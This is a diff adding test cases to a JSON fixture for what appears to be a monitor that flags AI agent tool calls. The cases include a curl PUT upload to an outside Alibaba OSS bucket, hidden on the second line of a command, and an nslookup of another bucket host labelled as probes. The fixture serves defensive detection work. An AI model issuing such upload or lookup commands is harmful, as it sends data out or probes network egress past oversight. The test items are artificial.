@@ -58,5 +58,23 @@
     "text": "nslookup routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com",
     "shouldMatch": true,
     "eventKind": "tool_use"
+  },
+  {
+    "label": "probe upload on the second line of a command",
+    "text": "ls -la /app\ncurl -s -X PUT --data-binary x http://sanmaohe.oss-cn-beijing.aliyuncs.com/u",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "probe command quoted into a notes file",
+    "text": "echo \"curl http://sanmaohe.oss-cn-beijing.aliyuncs.com/u\" > notes.txt",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "lookup quoted into a notes file",
+    "text": "echo 'nslookup routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com' >> todo.md",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
   }
 ]
